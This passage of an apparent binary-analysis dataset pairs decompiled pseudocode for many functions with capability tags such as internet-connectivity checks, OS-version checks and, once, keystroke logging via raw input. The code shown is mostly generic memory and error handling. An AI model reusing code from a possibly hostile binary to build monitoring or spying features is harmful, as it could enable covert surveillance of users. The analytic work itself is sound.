*puVar3 = 0;\n                var_14h = &var_198h;\n                var_10h = 0;\n                var_1b4h = puVar3 + 1;\n                do {\n                    cVar1 = *var_1b4h;\n                    var_1b4h = var_1b4h + 1;\n                } while (cVar1 != '\\0');\n                uVar2 = fcn.00076ed0(arg_8h, &var_14h, puVar3 + 1, var_1b4h + (1 - (puVar3 + 2)), 1);\n                if (uVar2 == 0) {\n                    if (var_118h != '\\0') {\n                        var_1c4h = &var_118h;\n                        do {\n                            cVar1 = *var_1c4h;\n                            var_1c4h = var_1c4h + 1;\n                        } while (cVar1 != '\\0');\n                        arg_8h_00 = var_1c4h + (2 - (&var_118h + 1));\n                        arg_ch_00 = fcn.00035200(arg_8h_00);\n                        if (arg_ch_00 == NULL) {\n                            fcn.00077140(arg_8h, 0);\n                            return 0x21590004;\n                        }\n                        var_1d4h = &var_118h;\n                        var_1d8h = arg_ch_00;\n                        do {\n                            cVar1 = *var_1d4h;\n                            *var_1d8h = cVar1;\n                            var_1d4h = var_1d4h + 1;\n                            var_1d8h = var_1d8h + 1;\n                        } while (cVar1 != '\\0');\n                        arg_ch_00[arg_8h_00 + -1] = '\\0';\n                        for (var_1a8h = arg_ch_00; *var_1a8h != '\\0'; var_1a8h = var_1a8h + 1) {\n                            if (*var_1a8h == ',') {\n                                *var_1a8h = '\\0';\n                            }\n                        }\n                        uVar2 = fcn.00077250(*arg_8h, arg_ch_00, 0);\n                        if (uVar2 != 0) {\n                            fcn.00035330(arg_ch_00);\n                            fcn.00077140(arg_8h, 0);\n                            fcn.00029970(1, 0, uVar2, 0, 0);\n                            return uVar2;\n                        }\n                        fcn.00035330(arg_ch_00);\n                    }\n                    if (arg_10h != NULL) {\n                        *arg_10h = var_8h + 1000000000;\n                    }\n                    uVar2 = 0;\n                }\n                else {\n                    fcn.00029970(1, 0, uVar2, 0, 0);\n                }\n            }\n        }\n        else {\n            uVar2 = var_4h + 0x191U | 0x21590000;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1353
    },
    "00026c80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00026c80(void)\n\n{\n    fcn.000344f0(0xb1c59dd4);\n    *0xb1c59dd8 = fcn.000352f0(0x1a0, 0x14);\n    if (*0xb1c59dd8 != 0) {\n        fcn.00033ff0(0xb1c59c94);\n        fcn.0001a8e0(0xb1c59ddc, 0xb1bf5ae0, 0);\n        if (*0xb1c6888c == 0) {\n            *0xb1c6888c = -0x4e40bc60;\n        }\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00026ce0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00026ce0(void)\n\n{\n    int32_t var_4h;\n    \n    fcn.000340b0(0xb1c59c94);\n    fcn.00037270(0xb1c59ddc, 0);\n    fcn.00037220(0xb1c59ddc);\n    fcn.00034080(0xb1c59c94);\n    if (*0xb1c59dd8 != 0) {\n        fcn.00034550(0xb1c59dd4);\n        for (var_4h = 0; var_4h < 0x14; var_4h = var_4h + 1) {\n            if (*(*0xb1c59dd8 + var_4h * 0x1a0) != 0) {\n                fcn.00077140(var_4h * 0x1a0 + *0xb1c59dd8, 0);\n            }\n        }\n        fcn.00035330(*0xb1c59dd8);\n        *0xb1c59dd8 = 0;\n        fcn.000345c0(0xb1c59dd4);\n    }\n    fcn.00034520(0xb1c59dd4);\n    return;\n}\n",
        "token_count": 288
    },
    "00026da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00026e01\n\nint32_t __cdecl\nfcn.00026da0(uint noname_0, int32_t arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h, uint *arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_30h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_8h = 0;\n    if (((arg_ch < 100) || (*(arg_20h + 8) == '\\x04')) ||\n       (iVar1 = fcn.000286d0(&arg_10h, &arg_14h, &var_8h),  iVar1 == 0)) {\n        if (*(arg_20h + 8) - 1 < 4) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        fcn.00029970(5, 0x21590001, 0, arg_ch, *(arg_20h + 4));\n        *arg_18h = 0;\n        *arg_1ch = 0;\n        fcn.00035330(var_8h);\n        iVar1 = 0x21590001;\n    }\n    return iVar1;\n}\n",
        "token_count": 310
    },
    "000270d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.000270d0(uint32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_34h;\n    uint var_30h;\n    uint *var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_18h = 0x21590001;\n    var_ch = NULL;\n    var_10h = 0;\n    var_4h = 0;\n    var_1ch = 0;\n    if (arg_ch < 100) {\n        *arg_18h = 0;\n        *arg_1ch = 0;\n        for (var_8h = 0; var_8h < 6; var_8h = var_8h + 1) {\n            if (*(var_8h * 8 + -0x4e3a6bf8) == arg_ch) {\n                var_18h = (**(var_8h * 8 + -0x4e3a6bf4))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n                break;\n            }\n        }\n    }\n    else {\n        if (arg_14h == 0) {\n            var_20h = NULL;\n        }\n        else {\n            var_20h = fcn.0002f1f0(arg_10h, arg_14h);\n            if (var_20h == NULL) {\n                return 0x215901f8;\n            }\n        }\n        var_8h = var_10h;\n        var_18h = fcn.0002afa0(-(arg_20h != 0) & arg_8h, arg_ch, var_20h, &var_1ch, &var_ch, &var_8h, arg_20h);\n        var_10h = var_8h;\n        while (var_20h != NULL) {\n            puVar1 = *var_20h;\n            if (var_20h[4] != var_20h + 5) {\n                fcn.00035330(var_20h[4]);\n            }\n            fcn.00035330(var_20h);\n            var_20h = puVar1;\n        }\n        if (0x200 < var_10h) {\n            fcn.00036ab0(0xb1c685e0);\n            if ((*0xb1c5b36c != NULL) && (*0xb1c5b370 != NULL)) {\n                iVar2 = (**0xb1c5b370)(var_10h);\n                var_4h = iVar2 + 4;\n                var_14h = fcn.00035200(var_4h);\n                if (var_14h != NULL) {\n                    uVar3 = fcn.00035490(var_10h);\n                    *var_14h = uVar3;\n                    var_18h = (**0xb1c5b36c)(var_14h + 1, &var_4h, var_ch, var_10h);\n                    if ((var_18h == 0) && (var_4h < var_10h)) {\n                        var_1ch = var_1ch | 0x80;\n                        fcn.00035330(var_ch);\n                        var_ch = var_14h;\n                        var_10h = var_4h + 4;\n                    }\n                    else {\n                        fcn.00035330(var_14h);\n                        var_18h = 0;\n                    }\n                }\n            }\n            fcn.00036b60(0xb1c685e0);\n        }\n        iVar2 = fcn.00029510(&var_30h, 0x10, 0x227);\n        if (iVar2 == 0) {\n            iVar2 = fcn.000202d0(&var_30h, 0x10, var_10h);\n            *arg_1ch = iVar2 + 1;\n            iVar2 = fcn.00077b10(arg_8h, *arg_1ch, 0);\n            *arg_18h = iVar2;\n            if (*arg_18h == 0) {\n                *arg_1ch = 0;\n                var_18h = 0x21590004;\n            }\n            else {\n                iVar2 = fcn.000202f0(&var_30h, 0x10, *arg_18h + 1, var_ch, var_10h);\n                *arg_1ch = iVar2 + 1;\n                **arg_18h = var_1ch;\n            }\n        }\n        else {\n            var_18h = 0x215901f9;\n        }\n    }\n    fcn.00035330(var_ch);\n    return var_18h;\n}\n",
        "token_count": 1188
    },
    "00027410": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00027410(int32_t *arg_8h)\n\n{\n    int32_t arg_ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    var_4h = arg_8h;\n    var_8h = 0;\n    var_ch = 0xb1c59518;\n    var_10h = 0;\n    arg_ch = fcn.000270d0(&var_ch, *arg_8h, arg_8h + 4, arg_8h[3], &var_8h, &var_10h, 0);\n    if (((var_4h[1] == 3) && (*var_4h == 1)) && (arg_ch == 0)) {\n        var_14h = 0;\n    }\n    else {\n        var_14h = fcn.000274e0(var_4h[2], arg_ch, var_8h, var_10h);\n    }\n    (**0xb1c5951c)(&var_ch, var_8h, 0);\n    fcn.00029970(5, arg_ch, var_14h, *var_4h, var_4h[2]);\n    fcn.00035330(arg_8h);\n    return 0;\n}\n",
        "token_count": 316
    },
    "000274e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000274e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    var_18h = arg_ch;\n    var_4h = fcn.00023520(0xffffffff, 1, arg_8h, arg_10h, arg_14h, &var_18h);\n    if (var_4h == 0) {\n        iVar1 = fcn.00037240(0xb1c685f8);\n        if (iVar1 != 0) {\n            fcn.000340b0(0xb1c685f8);\n        }\n        var_18h = 0;\n    }\n    else {\n        var_18h = var_4h + 0x191U | 0x21590000;\n        iVar1 = fcn.00023520(0xffffffff, 1, arg_8h, 0, 0, &var_18h);\n        if (iVar1 != 0) {\n            var_18h = iVar1 + 0x191U | 0x21590000;\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 338
    },
    "00027590": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00027590(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *arg_8h_00;\n    uint var_21ch;\n    char *var_218h;\n    uint *var_214h;\n    uint var_210h;\n    uint var_208h;\n    uint *var_204h;\n    uint var_200h;\n    uint var_1f8h;\n    char *var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    char *var_1e8h;\n    uint var_1e4h;\n    int32_t var_1e0h;\n    char *var_1dch;\n    int32_t var_1d8h;\n    uint *var_1d4h;\n    int32_t var_1d0h;\n    int32_t var_1cch;\n    uint var_1c8h;\n    uint *var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1a0h;\n    uint var_120h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_4h;\n    \n    var_1d8h = 0;\n    var_1e0h = 0;\n    iVar2 = fcn.00029510(&fcn.00027590::var_1b0h, 0x10, 0x228);\n    if (iVar2 == 0) {\n        var_4h = fcn.00020560(&fcn.00027590::var_1b0h, 0x10, 0x195);\n        if (arg_14h < var_4h) {\n            var_1d8h = 0x21590064;\n        }\n        else {\n            iVar2 = fcn.000203c0(&fcn.00027590::var_1b0h, 0x10, arg_10h, var_4h);\n            if ((iVar2 == 0x195) &&\n               (iVar2 = fcn.00020410(&fcn.00027590::var_1b0h, 0x10, &fcn.00027590::var_1a0h, arg_10h, var_4h), \n               iVar2 == 0x195)) {\n                fcn.00026b70(&fcn.00027590::var_1a0h);\n                if (arg_20h != 0) {\n                    var_1e4h = fcn.00029470(1, 0);\n                    var_1e4h = fcn.00035490(var_1e4h);\n                    var_1d8h = fcn.00077b90(arg_8h, &fcn.00027590::var_1e4h, 4, 0);\n                    if (var_1d8h != 0) {\n                        var_1d8h = fcn.00027c70(var_1d8h, arg_8h, arg_18h, arg_1ch);\n                        goto code_r0x00027c3e;\n                    }\n                }\n                var_1e0h = fcn.00028880(&fcn.00027590::var_1a0h);\n                if (var_1e0h == 0) {\n                    var_1d4h = &fcn.00027590::var_1a0h;\n                    pcVar3 = fcn.000785ce(var_1d4h, 0x2f);\n                    if (pcVar3 == NULL) {\n                        var_1dch = pcVar3;\n                        var_1d8h = fcn.00027c70(0x21590064, arg_8h, arg_18h, arg_1ch);\n                        goto code_r0x00027c3e;\n                    }\n                    *pcVar3 = '\\0';\n                    var_1dch = pcVar3 + 1;\n                    var_1c4h = var_1d4h;\n                    var_1c0h = 0;\n                    var_1f4h = var_1dch;\n                    do {\n                        cVar1 = *var_1f4h;\n                        var_1f4h = var_1f4h + 1;\n                    } while (cVar1 != '\\0');\n                    var_1d8h = fcn.00076ed0(&fcn.00027590::var_1e0h, &fcn.00027590::var_1c4h, var_1dch, \n                                            var_1f4h + (1 - (pcVar3 + 2)), 1);\n                    if (var_1d8h != 0) {\n                        var_1d8h = fcn.00027c70(var_1d8h, arg_8h, arg_18h, arg_1ch);\n                        goto code_r0x00027c3e;\n                    }\n                    var_1dch[-1] = '/';\n                    if (var_120h != '\\0') {\n                        var_204h = &fcn.00027590::var_120h;\n                        do {\n                            cVar1 = *var_204h;\n                            var_204h = var_204h + 1;\n                        } while (cVar1 != '\\0');\n                        arg_8h_00 = var_204h + (2 - (&fcn.00027590::var_120h + 1));\n                        pcVar3 = fcn.00035200(arg_8h_00);\n                        if (pcVar3 == NULL) {\n                            fcn.00077140(&fcn.00027590::var_1e0h, 0);\n                            var_1d8h = fcn.00027c70(0x21590004, arg_8h, arg_18h, arg_1ch);\n                            goto code_r0x00027c3e;\n                        }\n                        var_214h = &fcn.00027590::var_120h;\n                        var_218h = pcVar3;\n                        do {\n                            cVar1 = *var_214h;\n                            *var_218h = cVar1;\n                            var_214h = var_214h + 1;\n                            var_218h = var_218h + 1;\n                        } while (cVar1 != '\\0');\n                        pcVar3[arg_8h_00 + -1] = '\\0';\n                        for (var_1e8h = pcVar3; *var_1e8h != '\\0'; var_1e8h = var_1e8h + 1) {\n                            if (*var_1e8h == ',') {\n                                *var_1e8h = '\\0';\n                            }\n                        }\n                        var_1d8h = fcn.00077250(var_1e0h, pcVar3, 0);\n                        if (var_1d8h != 0) {\n                            fcn.00035330(pcVar3);\n                            fcn.00077140(&fcn.00027590::var_1e0h, 0);\n                            var_1d8h = fcn.00027c70(var_1d8h, arg_8h, arg_18h, arg_1ch);\n                            goto code_r0x00027c3e;\n                        }\n                        fcn.00035330(pcVar3);\n                    }\n                }\n                if (arg_20h == 0) {\n                    var_1d8h = fcn.00077500(var_1e0h, var_20h, arg_10h + var_4h, arg_14h - var_4h, \n                                            &fcn.00027590::var_1b4h, &fcn.00027590::var_1bch, &fcn.00027590::var_1d0h, \n                                            var_1ch, 0);\n                    if (var_1d8h != 0) {\n                        fcn.00077140(&fcn.00027590::var_1e0h, 0);\n                        var_1d8h = fcn.00027c70(var_1d8h, arg_8h, arg_18h, arg_1ch);\n                        goto code_r0x00027c3e;\n                    }\n                }\n                else {\n                    var_1d8h = fcn.00077620(var_1e0h, var_20h, arg_10h + var_4h, arg_14h - var_4h, \n                                            &fcn.00027590::var_1b8h, 0);\n                    if (var_1d8h != 0) {\n                        fcn.00077140(&fcn.00027590::var_1e0h, 0);\n                        var_1d8h = fcn.00027c70(var_1d8h, arg_8h, arg_18h, arg_1ch);\n                        goto code_r0x00027c3e;\n                    }\n                    var_1cch = var_1e0h;\n                    var_1c8h = var_1b8h;\n                    var_1d8h = fcn.00077bc0(arg_8h, 0xe, &fcn.00027590::var_1cch, 8, 0);\n                    if (var_1d8h != 0) {\n                        fcn.00077a60(var_1e0h, var_1b8h);\n                    }\n                    var_1d8h = fcn.000778d0(var_1e0h, var_1b8h, &fcn.00027590::var_1b4h, &fcn.00027590::var_1bch, \n                                            &fcn.00027590::var_1d0h, var_1ch, 0);\n                    if (var_1d8h != 0) {\n                        var_1d8h = fcn.00027c70(var_1d8h, arg_8h, arg_18h, arg_1ch);\n                        goto code_r0x00027c3e;\n                    }\n                }\n                if (var_1d0h == 0) {\n                    *arg_18h = 0;\n                    *arg_1ch = 0;\n                }\n                else {\n                    iVar2 = fcn.00077b10(arg_8h, var_1d0h, 0);\n                    *arg_18h = iVar2;\n                    if (*arg_18h == 0) {\n                        var_1d8h = 0x21590004;\n                        fcn.000779e0(0x27be2, var_1bch);\n                        goto code_r0x00027c3e;\n                    }\n                    fcn.0007877e(*arg_18h, var_1bch, var_1d0h);\n                    *arg_1ch = var_1d0h;\n                }\n                fcn.000779e0(var_1e0h, var_1bch);\n                var_1d8h = var_1b4h;\n            }\n            else {\n                var_1d8h = 0x21590064;\n            }\n        }\n    }\n    else {\n        var_1d8h = 0x215901f9;\n    }\ncode_r0x00027c3e:\n    if (var_1e0h != 0) {\n        fcn.00028a10(var_1e0h, &fcn.00027590::var_1a0h);\n    }\n    return var_1d8h;\n}\n",
        "token_count": 2691
    },
    "00027c70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00027c70(uint arg_8h, uint arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    uint *arg_8h_00;\n    uint uVar1;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00077b10(arg_ch, 0x14, 0);\n    if (arg_8h_00 == NULL) {\n        *arg_10h = 0;\n        *arg_14h = 0;\n    }\n    else {\n        *arg_8h_00 = 0;\n        arg_8h_00[1] = 0;\n        arg_8h_00[2] = 0;\n        arg_8h_00[3] = 0;\n        arg_8h_00[4] = 0;\n        uVar1 = fcn.00029470(1, 0);\n        *arg_8h_00 = uVar1;\n        arg_8h_00[1] = arg_8h;\n        fcn.00068fc0(arg_8h_00);\n        *arg_10h = arg_8h_00;\n        *arg_14h = 0x14;\n    }\n    fcn.00029970(6, arg_8h, 0, 0, 0);\n    return 0x215901f4;\n}\n",
        "token_count": 316
    },
    "00027d00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00027d00(uint arg_8h, uint noname_1, uint *arg_10h, uint32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_1ch = 0;\n    var_14h = 0;\n    if (arg_14h < 0x3d) {\n        var_18h = 0x21590064;\n    }\n    else {\n        var_10h = arg_10h;\n        fcn.00026bb0(arg_10h);\n        var_8h = fcn.00023560(*var_10h, var_10h[1], &var_4h, &var_1ch);\n        if (var_8h == 0) {\n            if (var_4h == 0) {\n                *arg_18h = 0;\n                *arg_1ch = 0;\n            }\n            else {\n                iVar1 = fcn.00077b10(arg_8h, var_4h << 6, 0);\n                if (iVar1 == 0) {\n                    var_18h = 0x21590004;\n                    goto code_r0x00027e09;\n                }\n                fcn.0007877e(iVar1, var_1ch, var_4h << 6);\n                for (var_ch = 0; var_ch < var_4h; var_ch = var_ch + 1) {\n                    fcn.00025200(var_ch * 0x40 + iVar1);\n                }\n                *arg_18h = iVar1;\n                *arg_1ch = var_4h << 6;\n            }\n            var_18h = 0;\n        }\n        else {\n            var_18h = var_8h + 0x191U | 0x21590000;\n        }\n    }\ncode_r0x00027e09:\n    fcn.00023800(var_1ch);\n    fcn.00035330(var_14h);\n    return var_18h;\n}\n",
        "token_count": 536
    },
    "00027e30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00027e30(uint arg_8h, uint noname_1, uint *arg_10h, uint32_t arg_14h, int32_t *arg_18h, uint *arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t var_64h;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    uint32_t var_58h;\n    uint32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_20h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_60h = 0;\n    var_10h = 0;\n    if (arg_14h < 0x3d) {\n        var_64h = 0x21590064;\n    }\n    else {\n        var_ch = arg_10h;\n        fcn.00026bb0(arg_10h);\n        if ((var_ch[1] == 0) && (*(var_ch + 3) == '\\x1b')) {\n            fcn.0002a3c0(*var_ch, var_ch[2]);\n        }\n        if ((*(var_ch + 3) & 0x10) != 0) {\n            fcn.00028610(*var_ch, var_ch[1], var_ch[2]);\n        }\n        if ((*(var_ch + 3) & 1) == 0) {\n            var_4h = fcn.000235a0(*var_ch, var_ch[1], var_ch + 2, &var_50h);\n        }\n        else {\n            var_4h = fcn.000235a0(*var_ch, var_ch[1], 0, &var_50h);\n        }\n        if (var_4h == 0) {\n            var_5ch = *(var_ch + 0x11);\n            if (var_5ch == 0) {\n                var_5ch = var_20h - *(var_ch + 0xd);\n            }\n            if (arg_20h == 0) {\n                if ((*(var_ch + 3) & 4) == 0) {\n                    if (var_20h == 0) {\n                        *arg_18h = 0;\n                        *arg_1ch = 0;\n                    }\n                    else {\n                        iVar1 = fcn.00077b10(arg_8h, var_5ch, 0);\n                        *arg_18h = iVar1;\n                        if (*arg_18h == 0) {\n                            var_64h = 0x21590004;\n                            goto code_r0x00028227;\n                        }\n                        var_4h = fcn.000236a0(*var_ch, var_ch[1], var_4ch, *(var_ch + 0xd), *arg_18h, var_5ch, &var_8h);\n                        if (var_4h != 0) {\n                            var_64h = var_4h + 0x191U | 0x21590000;\n                            goto code_r0x00028227;\n                        }\n                        *arg_1ch = var_8h;\n                    }\n                }\n                else {\n                    iVar1 = fcn.00077b10(arg_8h, 0x40, 0);\n                    *arg_18h = iVar1;\n                    if (*arg_18h == 0) {\n                        var_64h = 0x21590004;\n                        goto code_r0x00028227;\n                    }\n                    fcn.00025200(&var_50h);\n                    puVar3 = &var_50h;\n                    puVar4 = *arg_18h;\n                    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n                        *puVar4 = *puVar3;\n                        puVar3 = puVar3 + 1;\n                        puVar4 = puVar4 + 1;\n                    }\n                    fcn.00025200(&var_50h);\n                    *arg_1ch = 0x40;\n                }\n            }\n            else {\n                if ((*(var_ch + 3) & 6) != 0) {\n                    fcn.00025200(&var_50h);\n                    var_64h = fcn.00077b90(arg_8h, &var_50h, 0x40, 0);\n                    if (var_64h != 0) goto code_r0x00028227;\n                    fcn.00025200(&var_50h);\n                }\n                if ((*(var_ch + 3) & 4) == 0) {\n                    if ((*(var_ch + 0x19) == 0) || (*(var_ch + 0x19) < *(var_ch + 0x15))) {\n                        var_64h = 0x21590064;\n                        goto code_r0x00028227;\n                    }\n                    var_60h = fcn.00035200(*(var_ch + 0x19));\n                    if (var_60h == 0) {\n                        var_64h = 0x21590004;\n                        goto code_r0x00028227;\n                    }\n                    for (var_58h = 0; var_58h < var_5ch; var_58h = var_58h + var_54h) {\n                        if (*(var_ch + 0x19) < *(var_ch + 0x15) || *(var_ch + 0x19) == *(var_ch + 0x15)) {\n                            uVar2 = fcn.000785f8();\n                            var_54h = uVar2 % ((*(var_ch + 0x15) - *(var_ch + 0x19)) + 1U) + *(var_ch + 0x19);\n                        }\n                        else {\n                            uVar2 = fcn.000785f8();\n                            var_54h = uVar2 % ((*(var_ch + 0x19) - *(var_ch + 0x15)) + 1U) + *(var_ch + 0x15);\n                        }\n                        if ((var_54h == 0) || (*(var_ch + 0x19) <= var_54h && var_54h != *(var_ch + 0x19))) {\n                            var_64h = 0x215901f6;\n                            goto code_r0x00028227;\n                        }\n                        var_4h = fcn.000236a0(*var_ch, var_ch[1], var_4ch, *(var_ch + 0xd) + var_58h, var_60h, var_54h, \n                                              &var_54h);\n                        if (var_4h != 0) {\n                            var_64h = var_4h + 0x191U | 0x21590000;\n                            goto code_r0x00028227;\n                        }\n                        var_64h = fcn.00077b90(arg_8h, var_60h, var_54h, 0);\n                        if (var_64h != 0) goto code_r0x00028227;\n                    }\n                    var_64h = fcn.00077b90(arg_8h, 0, 0, 0);\n                    if (var_64h != 0) goto code_r0x00028227;\n                }\n            }\n            if (((*(var_ch + 3) & 8) == 0) || (var_4h = fcn.000236f0(*var_ch, var_ch[1], var_4ch),  var_4h == 0)) {\n                var_64h = 0;\n            }\n            else {\n                var_64h = var_4h + 0x191U | 0x21590000;\n            }\n        }\n        else {\n            var_64h = var_4h + 0x191U | 0x21590000;\n        }\n    }\ncode_r0x00028227:\n    fcn.00035330(var_60h);\n    fcn.00035330(var_10h);\n    return var_64h;\n}\n",
        "token_count": 1858
    },
    "00028250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_a0h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl\nfcn.00028250(uint arg_8h, uint noname_1, uint *arg_10h, uint32_t arg_14h, uint *arg_18h, uint *arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *var_a0h;\n    uint *var_9ch;\n    uint *var_98h;\n    uint *var_94h;\n    uint var_90h;\n    uint var_8ch;\n    int32_t var_64h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_37h;\n    int32_t var_2bh;\n    uint var_27h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4ch = 0;\n    if (arg_14h < 0x3d) {\n        var_94h = 0x21590064;\n    }\n    else {\n        var_98h = fcn.00029470(400, 20000);\n        puVar2 = arg_10h;\n        puVar3 = &var_48h;\n        for (iVar1 = 0xf; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = *puVar2;\n        fcn.00026bb0(&var_48h);\n        if (arg_20h == 0) {\n            if (var_37h == -1) {\n                var_37h = arg_14h - 0x3d;\n            }\n            if (var_2bh == -1) {\n                var_2bh = var_37h;\n            }\n        }\n        if ((var_3ch & 1) == 0) {\n            var_4h = fcn.000235a0(var_48h, var_44h, &var_40h, &var_90h);\n            if (var_4h == 0) {\n                if (var_64h == var_2bh) {\ncode_r0x000283bb:\n                    if (arg_20h == 0) {\n                        if (var_37h + 0x3dU == arg_14h) {\n                            var_4h = fcn.00023660(var_48h, var_44h, var_8ch, stack0xffffffc1, arg_10h + 0x3d, var_37h);\n                            if (var_4h == 0) {\ncode_r0x000284d4:\n                                var_94h = NULL;\n                                if (((var_44h == 0) && (iVar1 = fcn.00029470(1, 0),  var_48h == iVar1)) &&\n                                   (iVar1 = fcn.00037240(0xb1c68608),  iVar1 != 0)) {\n                                    fcn.000340b0(0xb1c68608);\n                                }\n                            }\n                            else {\n                                var_94h = var_4h + 0x191U | 0x21590000;\n                            }\n                        }\n                        else {\n                            var_94h = 0x21590064;\n                        }\n                    }\n                    else {\n                        var_8h = stack0xffffffc1;\n                        while( true ) {\n                            puVar2 = var_98h;\n                            var_90h = 0;\n                            var_94h = var_98h;\n                            var_98h = &var_9ch;\n                            var_9ch = &var_a0h;\n                            